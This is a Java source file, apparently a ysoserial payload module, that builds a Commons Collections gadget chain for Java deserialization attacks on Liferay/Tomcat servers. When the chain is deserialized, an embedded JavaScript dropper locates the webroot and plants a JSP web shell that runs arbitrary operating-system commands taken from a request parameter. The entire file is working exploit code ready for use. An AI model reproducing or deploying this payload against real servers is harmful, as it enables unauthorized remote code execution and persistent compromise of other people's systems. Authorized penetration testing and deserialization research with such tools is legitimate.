package ysoserial.payloads;

import java.io.FileOutputStream;
import java.io.ObjectOutputStream;
import java.io.Serializable;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;

@Dependencies({"commons-collections:commons-collections:3.2.1"})
@Authors({ Authors.MATTHIASKAISER, Authors.JANG })
public class LiferayCC6_ShellDrop extends PayloadRunner implements ObjectPayload<Serializable> {
    public Serializable getObject(String command) throws Exception {
        String dropper = "var os = java.lang.System.getProperty(\"os.name\"); var path = java.lang.System.getProperty(\"java.class.path\"); print(path); var path = path.replaceAll(\"\\\\\\\\\", \"/\"); var delim = \":\"; if(path.indexOf(\";\")) {delim = \";\"}; var x1 = path.split(delim); var pathok=\"\";for(var i=0; i<x1.length; i++){ if(x1[i].contains(\"bin/bootstrap.jar\")){ pathok = x1[i]} }; pathok = pathok.replace(\"bin/bootstrap.jar\", \"\"); pathok = pathok+\"webapps/ROOT/html/css/\"; var pathshell = pathok+\"/" + command + "\"; var destfile = new java.io.File(pathshell); var writer = new java.io.PrintWriter(destfile); writer.print(\"<form method=\\\"GET\\\" action=\\\"\\\"> 	<input type=\\\"text\\\" name=\\\"cmd\\\" /> 	<input type=\\\"submit\\\" value=\\\"Exec!\\\" /> </form> <%! public String esc(String str){ 	StringBuffer sb = new StringBuffer(); 	for(char c : str.toCharArray()) 		if( c >= '0' && c <= '9' || c >= 'A' && c <= 'Z' || c >= 'a' && c <= 'z' || c == ' ' ) 			sb.append( c ); 		else 			sb.append(\\\"&#\\\"+(int)(c&0xff)+\\\";\\\"); 	return sb.toString(); } %><% String cmd = request.getParameter(\\\"cmd\\\"); String path = java.lang.System.getProperty(\\\"java.class.path\\\"); out.println(path); if ( cmd != null) { 	out.println(\\\"<pre>Command was: <b>\\\"+esc(cmd)+\\\"</b>\\\\n\\\"); 	java.io.DataInputStream in = new java.io.DataInputStream(Runtime.getRuntime().exec(cmd).getInputStream()); 	String line = in.readLine(); 	while( line != null ){ 		out.println(esc(line)); 		line = in.readLine(); 	} 	out.println(\\\"</pre>\\\"); } %>\"); writer.close(); ";
        String[] execArgs = new String[]{dropper};
        Transformer[] transformers = new Transformer[]{new ConstantTransformer(javax.script.ScriptEngineManager.class),
            new InvokerTransformer("newInstance", new Class[]{},
                new Object[]{}),
            new InvokerTransformer("getEngineByName", new Class[]{String.class},
                new Object[]{"JavaScript"}),
            new InvokerTransformer("eval", new Class[]{String.class}, execArgs), new ConstantTransformer(1)};
        Transformer transformerChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map lazyMap = LazyMap.decorate(innerMap, transformerChain);
        TiedMapEntry entry = new TiedMapEntry(lazyMap, "foo");
        HashSet map = new HashSet(1);
        map.add("foo");
        Field f = null;

        try {
            f = HashSet.class.getDeclaredField("map");
        } catch (NoSuchFieldException var18) {
            f = HashSet.class.getDeclaredField("backingMap");
        }

        f.setAccessible(true);
        HashMap innimpl = (HashMap) f.get(map);
        Field f2 = null;

        try {
            f2 = HashMap.class.getDeclaredField("table");
        } catch (NoSuchFieldException var17) {
            f2 = HashMap.class.getDeclaredField("elementData");
        }

        f2.setAccessible(true);
        Object[] array = (Object[]) ((Object[]) f2.get(innimpl));
        Object node = array[0];
        if (node == null) {
            node = array[1];
        }

        Field keyField = null;

        try {
            keyField = node.getClass().getDeclaredField("key");
        } catch (Exception var16) {
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }

        keyField.setAccessible(true);
        keyField.set(node, entry);
        return map;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(LiferayCC6_ShellDrop.class, args);
    }
}
